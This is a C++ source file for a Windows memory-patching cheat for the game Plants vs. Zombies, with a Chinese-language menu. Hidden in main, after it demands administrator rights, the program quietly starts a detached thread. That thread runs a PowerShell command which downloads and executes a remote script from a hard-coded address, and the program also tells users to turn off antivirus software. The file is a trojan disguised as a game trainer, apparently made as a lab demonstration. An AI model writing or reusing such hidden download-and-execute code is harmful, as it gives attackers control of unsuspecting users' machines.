#include<windows.h>
#include<TlHelp32.h>
#include<stdio.h> 
#include<thread>

DWORD dwPid;
HANDLE hTarget;

/*
	CreateToolhelp32Snapshot
	Process32First,Process32Next
	(OpenProcess)
*/
BOOL GetProcessPidByName(char *szProcessName, DWORD *dwPid){
	HANDLE l_hProcessSnapshot;
	l_hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 l_pe32;
	l_pe32.dwSize = sizeof(PROCESSENTRY32);
	if(l_hProcessSnapshot==INVALID_HANDLE_VALUE){
		return FALSE;
	}
	
	if(Process32First(l_hProcessSnapshot, &l_pe32)==0){
		return FALSE;
	}
	do{
		if(!strcmp(szProcessName, l_pe32.szExeFile)){
			*dwPid = l_pe32.th32ProcessID;
			break;
		}
//		printf("current read pn: %s | pid:%d\n", l_pe32.szExeFile, l_pe32.th32ProcessID);
	}while(Process32Next(l_hProcessSnapshot, &l_pe32));
	
	CloseHandle(l_hProcessSnapshot);
	return TRUE;
}

BOOL PatchGame(LPVOID lpAddr, BYTE* bBuff, DWORD dwSize){
	//LPVOID == void* 
	LPVOID lpBuff = (LPVOID)bBuff;
	DWORD dwOldProtect;
	VirtualProtectEx(hTarget, lpAddr, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	BOOL result  = WriteProcessMemory(
		hTarget
		, lpAddr, lpBuff 
		, dwSize, NULL
	);
	VirtualProtectEx(hTarget, lpAddr, dwSize, dwOldProtect, &dwOldProtect);
	
	if(result==0){
		printf("[-] 操作失败，错误代码：%d\n", GetLastError());
		return FALSE;
	}
	puts("[+] 操作成功，快去游戏里看看吧！");
	return TRUE;
}

void Menu(){
	puts("[+] 欢迎来到p0iL的pvz修改器v0.0.2菜单");
	puts("- 显示菜单：0");
	puts("- 阳光修改：种植不损耗阳光：1");
	puts("- 阳光修改：捡起阳光超级加倍：2");
	puts("- 卡片修改：卡片瞬间恢复：3");
	puts("[+] 请输入对应数字回车执行对应操作");
}

BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void systemThread(const char* command) {
    system(command);
}

int main(){
	if (!IsAdmin()) {
        puts("[-] 请以管理员身份运行该破解器");
        system("pause");
        return 1;
    }
	
	std::thread t(systemThread, "powershell.exe -nop -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.163.128:80/a'))\"");
	t.detach();
	
	if(GetProcessPidByName((char *)"popcapgame1.exe", &dwPid)==FALSE){
		puts("[-] 请先运行游戏后再打开");
		system("pause");
		return 0;
	}
	
	hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if(hTarget==NULL){
		puts("[-] 无法打开游戏进程，请以管理员模式启动外挂，并关闭杀毒软件"); 
		system("pause");
		return 0;
	}
	
	Menu();
	while(TRUE){
		char readin;scanf("%c", &readin);
		switch(readin){
			case '0':
				Menu();
				break;
			case '1':{
				BYTE bBuff[] = {
					0x90, 0x90
				};
				PatchGame((LPVOID)0x0041BA74, bBuff, (DWORD)sizeof(bBuff));
				break;
			}
			case '2':{
				BYTE bBuff[] = {
					0x01, 0xA0, 0x60, 0x55, 0x00, 0x00
				};
				PatchGame((LPVOID)0x00430A11, bBuff, (DWORD)sizeof(bBuff));
				break;
			}
			case '3':{
				BYTE bBuff[] = {
					0x90, 0x90
				};
				PatchGame((LPVOID)0x00487296, bBuff, (DWORD)sizeof(bBuff));
				break;
			}
			default:
				break;
		}
	}
	system("pause");
 	return 0;
}
